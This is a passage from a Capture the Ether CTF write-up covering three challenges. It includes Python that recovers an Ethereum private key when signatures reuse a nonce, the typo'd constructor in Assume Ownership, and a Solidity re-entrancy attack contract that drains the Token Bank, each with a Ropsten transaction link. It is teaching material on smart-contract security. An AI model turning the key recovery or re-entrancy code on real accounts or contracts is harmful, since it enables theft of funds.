Now that we have these values as bytes, all we have to do is concatenate them and then get the Keccak256 hash of its RLP encoding. In python I defined a set of functions for this entire process which you can find in `scripts/helper/utils.py`, but in a nutshell, if you have an object like the one we defined before, you can do this:

```python
import rlp
import web3

reconstructed_tx_1 = {
    'nonce': b'', 
    'gasPrice': HexBytes('0x3b9aca00'), 
    'gasLimit': HexBytes('0x5208'), 
    'to': HexBytes('0x92b28647ae1f3264661f72fb2eb9625a89d88a31'), 
    'value': HexBytes('0x1111d67bb1bb0000'), 
    'data': b'', 
    'v': HexBytes('0x03'), 
    'r': b'', 
    's': b''
}

reconstructed_tx_2 = {
    'nonce': b'\x01', 
    'gasPrice': HexBytes('0x3b9aca00'), 
    'gasLimit': HexBytes('0x5208'), 
    'to': HexBytes('0x92b28647ae1f3264661f72fb2eb9625a89d88a31'), 
    'value': HexBytes('0x1922e95bca330e00'), 
    'data': b'', 
    'v': HexBytes('0x03'), 
    'r': b'', 
    's': b''
}

z1 = web3.sha3(hexstr=rlp.encode(list(reconstructed_tx_1.values())).hex()).hex()
z2 = web3.sha3(hexstr=rlp.encode(list(reconstructed_tx_2.values())).hex()).hex()
```

And you've got $z_1$ and $z_2$.

#### Obtaining the private key

1. Get $r$, which we obtained previously by looking at the transactions with repeated $r$.

2. Compute $z$, which is the difference between $z_1$ and $z_2$:

$$ z = z_1 - z_2 $$

3. Compute $s$, for which we need to contemplate all the following scenarios:

1. $s = s_1 + s_2$
2. $s = s_1 - s_2$
3. $s = - s_1 + s_2$
4. $s = - s_1 - s_2$

Or more generally:

$$s = s_1*i + s_2*j$$

Where:

$$i,j \in \{1,-1\}$$

This can be easily done in a double loop:

```python 
for i in [1,-1]:
    for j in [1,-1]:
        s = s1*i + s2*j
```

4. Define an inverse modulus function which can compute the modular multiplicative inverse of an integer. After python 3.8 you can define it like this:

```python
def inverse_mod(a, m):
    if a == 0:
        return 0
    return pow(a, -1, m)
```

Which is exactly how it's defined in the `ecdsa` library. You can import this same function like this:

```python
from ecdsa.numbertheory import inverse_mod
```

The purpose of this function is to be able to obtain the modular multiplicative inverse of integers with modulus `n`, where `n` is the order `n` of `G` of a SECP256K1 elliptic curve as used in Ethereum.

In hex, the value of this prime number is `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`.

More generally:

$$inverse\_mod(a) = \bar{x} \mid \bar{a} *_n \bar{x} \equiv \bar{1}$$

Where:

* $a$ is the number for which we want to find the modular multiplicative inverse $x$, modulus $m$
* n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

5. Using this function and the previously obtained values, compute `k`:

$$k = z * inverse\_mod(s) \mod n$$

And then compute the private key $d$

$$d = inverse\_mod(r) * (s_1 * k - z_1) \mod n$$

If you're using integers, convert this final result $d$ into hex.

#### Python implementation

I have written a python implementation, modified from Eric Chen's answer on the Bitcoin StackExchange:

```python
# get private key with two k's using ecdsa-private-key-recovery
def get_private_key(r, s1, s2, z1, z2):
    """Get private key of an ethereum account 
    when the account has used a duplicate (or predictable) `r` (or `k` in ECDSA)
    based on Eric Chen's answer on the Bitcoin Stackexchange: https://bitcoin.stackexchange.com/a/110827
    """
    # convert everything to integer if it's a hex string
    hex_to_int = lambda x: int(x, 16) if isinstance(x, str) else x
    r, s1, s2, z1, z2 = map(hex_to_int, (r, s1, s2, z1, z2))

    # SECP256K1 order n of G
    p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

    # possible private keys
    possible_pks = []

    # loop over possible s1, s2 scenarios
    for i in [1,-1]:
        for j in [1,-1]:
            z = z1 - z2
            s = s1*i + s2*j
            r_inv = inverse_mod(r, p)
            s_inv = inverse_mod(s, p)
            k = (z * s_inv) % p
            d = (r_inv * (s1 * k - z1)) % p
            possible_pks.append(hex(d))

    return list(set(possible_pks))
```

#### Submission transaction

https://ropsten.etherscan.io/tx/0xe912a2b3ab8dee5e51e2f321bd21e753fba4fe82f7b09f09d010f6cf722a1196

***

## Miscellaneous

### Assume ownership

#### Objectives

> To complete this challenge, become the `owner`.

#### Solution

In this challenge, the constructor function `AssumeOwmershipChallenge()` has a typo, in `Ownership`, it's written as `Owmership`. This means that what was supposed to be a constructor never ran during deployment and as a result, `owner` is the null address. 

This also means we can call this `AssumeOwmershipChallenge()` function and become `owner`, which allows us to call `authenticate()` and pass the require statement that checks if we're owner.

#### Submission transaction

https://ropsten.etherscan.io/tx/0xb4f21a05d9620e5884ffe28b5abf285c5b6c4124998435c13b2fb685820c2276

***

### Token bank

#### Objectives

> I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens.\
> The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.

#### Solution

The ERC223 standard differs from the ERC20 standard in that it notifies the contract receiving the tokens when they're sent. In this case, the implementation does it through a fallback function called `tokenFallback()` which should be implemented in the contract receiving the tokens. 

The TokenBankChallenge contract implements it along with a `withdraw()` function. However, given this flexibility and how the `withdraw()` function is coded in TokenBankChallenge, there is a re-entrancy vulnerability that allows us to call the function multiple times before the balance is updated. Not only this, but given the version of the compiler the contracts are coded in (`0.4.21` as all challenges in capture the ether), the `withdraw()` function also causes an integer overflow in the `balanceOf` array for the contract address we're using to interact with it.

To solve it, we must code a contract that implements a function that calls `withdraw()` in the TokenBankChallenge contract, for example:

```js
function withdraw() public {
    if (token.balanceOf(address(challenge)) > 0) {
        challenge.withdraw(challenge.balanceOf(address(this)));
    }
}
```

Where `challenge` is an interface.

In this case, we will only call `withdraw()` again if there's funds still available in the contract.

A `tokenFallback()` function must also be implemented because the SimpleERC223Token contract will call it. This function must also include a call to the `withdraw()` in our attacker contract, I implemented it like this:

```js
function tokenFallback(address sender, uint256 value, bytes data) external {
    if (sender == address(challenge)) {
        withdraw();
    }
}
```

We only want to call withdraw when the TokenBankChallenge contract transfers funds to the attacker contract through `require(token.transfer(msg.sender, amount));` (line 106 in the challenge contract). 

The reentrancy vulnerability would be impossible to execute if the balance is updated prior to calling transfer in the token contract:

```js
function withdraw(uint256 amount) public {
    require(balanceOf[msg.sender] >= amount);
    balanceOf[msg.sender] -= amount;
    require(token.transfer(msg.sender, amount));
}
```

However, the contract is coded as follows:

```js
function withdraw(uint256 amount) public {
    require(balanceOf[msg.sender] >= amount);

    require(token.transfer(msg.sender, amount));
    balanceOf[msg.sender] -= amount;
}
```

#### Submission transaction

https://ropsten.etherscan.io/tx/0xd172a0fe62e154b55ca71d98f8003835121977c5ff18a1c4d76c97b5c4e380fb
